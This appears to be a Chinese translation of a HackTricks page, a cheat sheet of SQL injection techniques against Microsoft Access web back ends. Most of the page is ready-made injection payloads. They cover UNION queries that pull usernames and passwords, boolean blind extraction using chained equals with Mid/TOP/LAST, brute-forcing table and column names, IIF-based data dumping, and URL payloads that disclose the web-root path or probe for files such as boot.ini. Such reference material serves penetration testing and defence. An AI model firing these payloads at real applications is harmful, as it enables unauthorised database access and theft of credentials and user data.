# MS Access SQL注入

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！

- 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)

- **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **通过向[hacktricks仓库](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud仓库](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧。**

</details>

## 在线游乐场

* [https://www.w3schools.com/sql/trysql.asp?filename=trysql\_func\_ms\_format\&ss=-1](https://www.w3schools.com/sql/trysql.asp?filename=trysql\_func\_ms\_format\&ss=-1)

## 数据库限制

### 字符串拼接

可以使用`& (%26)`和`+ (%2b)`字符进行字符串拼接。
```sql
1' UNION SELECT 'web' %2b 'app' FROM table%00
1' UNION SELECT 'web' %26 'app' FROM table%00
```
### 注释

在MS Access中没有注释，但显然可以使用NULL字符删除查询的最后一个字符：
```sql
1' union select 1,2 from table%00
```
如果这个方法不起作用，你可以尝试修复查询语句的语法：
```sql
1' UNION SELECT 1,2 FROM table WHERE ''='
```
### 堆叠查询

不支持堆叠查询。

### LIMIT

**`LIMIT`** 操作符 **未实现**。然而，可以使用 `TOP` 操作符将 SELECT 查询结果限制为前 N 行。`TOP` 接受一个整数作为参数，表示要返回的行数。
```sql
1' UNION SELECT TOP 3 attr FROM table%00
```
就像TOP一样，你可以使用**`LAST`**来获取**从末尾开始的行**。

## UNION查询/子查询

在SQL注入中，通常需要执行新的查询来从其他表中提取信息。MS Access始终要求在**子查询或额外查询中指定`FROM`**。\
因此，如果你想执行`UNION SELECT`、`UNION ALL SELECT`或在条件中使用括号的`SELECT`，你总是**需要指定一个带有有效表名的`FROM`**。\
因此，你需要知道一个**有效的表名**。
```sql
-1' UNION SELECT username,password from users%00
```
### 链接等号 + 子字符串

{% hint style="warning" %}
这将允许您在不需要知道表名的情况下提取当前表的值。
{% endhint %}

**MS Access** 允许使用奇怪的语法，例如 **`'1'=2='3'='asd'=false`**。通常情况下，SQL注入将位于 **`WHERE`** 子句中，我们可以利用这一点。

假设您在 MS Access 数据库中有一个 SQLi，并且您知道（或猜测）一个**列名为 username**，这是您想要**提取**的字段。您可以通过使用 **`Mid`** 函数来获取子字符串，检查 Web 应用程序在使用链接等号技术时的不同响应，并可能通过**布尔注入**来提取内容。
```sql
'=(Mid(username,1,3)='adm')='
```
如果你知道要转储的**表名**和**列名**，你可以使用`Mid`、`LAST`和`TOP`的组合来通过布尔型SQL注入**泄露所有信息**：
```sql
'=(Mid((select last(useranme) from (select top 1 username from usernames)),1,3)='Alf')='
```
_请随意在在线游乐场中检查此内容。_

### 暴力破解表名

使用链式等号技术，您还可以使用以下方式**暴力破解表名**：
```sql
'=(select+top+1+'lala'+from+<table_name>)='
```
您还可以使用更传统的方法：
```sql
-1' AND (SELECT TOP 1 <table_name>)%00
```
_请随意在在线游乐场中检查此内容。_

* Sqlmap常见表名：[https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt](https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt)
* 还有另一个列表在[http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)

### 暴力破解列名

您可以使用等于链接技巧来**暴力破解当前列名**：
```sql
'=column_name='
```
或者使用 **group by**：
```sql
-1' GROUP BY column_name%00
```
或者你可以使用以下方法对**不同表**的列名进行暴力破解：
```sql
'=(SELECT TOP 1 column_name FROM valid_table_name)='

-1' AND (SELECT TOP 1 column_name FROM valid_table_name)%00
```
### 导出数据

我们已经讨论了[**链接等于技术**](ms-access-sql-injection.md#chaining-equals-+-substring) **来从当前表和其他表中导出数据**。但还有其他方法：
```sql
IIF((select mid(last(username),1,1) from (select top 10 username from users))='a',0,'ko')
```
简而言之，该查询使用“if-then”语句来触发成功时的“200 OK”或否则触发“500 Internal Error”。利用TOP 10运算符，可以选择前十个结果。随后使用LAST只考虑第十个元组。在该值上，使用MID运算符可以进行简单的字符比较。通过适当更改MID和TOP的索引，我们可以获取所有行的“username”字段的内容。

### 基于时间的注入

参考[https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676(v=technet.10)?redirectedfrom=MSDN](https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676\(v=technet.10\)?redirectedfrom=MSDN)

### 其他有趣的函数

* `Mid('admin',1,1)` 从位置1开始获取长度为1的子字符串（初始位置为1）
* `LEN('1234')` 获取字符串的长度
* `ASC('A')` 获取字符的ASCII值
* `CHR(65)` 根据ASCII值获取字符串
* `IIF(1=1,'a','b')` if then
* `COUNT(*)` 计算项目数量

## 枚举表

从[**这里**](https://dataedo.com/kb/query/access/list-of-tables-in-the-database)可以看到一个获取表名的查询：
```sql
select MSysObjects.name
from MSysObjects
where
MSysObjects.type In (1,4,6)
and MSysObjects.name not like '~*'
and MSysObjects.name not like 'MSys*'
order by MSysObjects.name
```
然而，请注意，通常会发现**无法访问读取表`MSysObjects`**的SQL注入。

## 文件系统访问

### Web根目录完整路径

了解**Web根目录的绝对路径可能有助于进一步的攻击**。如果应用程序错误没有完全隐藏，可以尝试从不存在的数据库中选择数据来揭示目录路径。

`http://localhost/script.asp?id=1'+'+UNION+SELECT+1+FROM+FakeDB.FakeTable%00`

MS Access会返回一个**包含Web目录完整路径名的错误消息**。

### 文件枚举

以下攻击向量可用于**推断远程文件系统上文件的存在**。如果指定的文件存在，MS Access会触发一个错误消息，通知数据库格式无效：

`http://localhost/script.asp?id=1'+UNION+SELECT+name+FROM+msysobjects+IN+'\boot.ini'%00`

另一种枚举文件的方法是**指定一个数据库.表项**。**如果**指定的**文件存在**，MS Access会显示一个**数据库格式错误消息**。

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+C:\boot.ini.TableName%00`

### .mdb文件名猜测

可以使用以下查询推断**数据库文件名（.mdb）**：

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+name[i].realTable%00`

其中**name\[i]是.mdb文件名**，**realTable是数据库中的一个存在的表**。虽然MS Access总是会触发一个错误消息，但可以区分无效的文件名和有效的.mdb文件名。

### .mdb密码破解

[**Access PassView**](https://www.nirsoft.net/utils/accesspv.html)是一个免费工具，可用于恢复Microsoft Access 95/97/2000/XP或Jet Database Engine 3.0/4.0的主数据库密码。

## 参考资料

* [http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- 您在**网络安全公司**工作吗？您想在HackTricks中看到您的**公司广告**吗？或者您想获得最新版本的PEASS或下载PDF格式的HackTricks吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！

- 发现我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- 获取[**官方PEASS和HackTricks衣物**](https://peass.creator-spring.com)

- **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享您的黑客技巧**。

</details>
